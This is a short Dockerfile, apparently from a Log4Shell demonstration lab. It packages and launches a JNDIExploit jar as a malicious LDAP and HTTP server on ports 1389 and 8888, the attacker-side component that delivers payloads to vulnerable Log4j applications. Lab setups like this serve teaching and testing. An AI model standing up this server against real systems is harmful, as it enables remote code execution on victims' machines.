FROM openjdk:8
EXPOSE 8888
EXPOSE 1389
COPY java/ /opt/demo/
CMD ["java","-jar","/opt/demo/JNDIExploit-1.2-SNAPSHOT.jar","-i","malicious","-p","8888"]
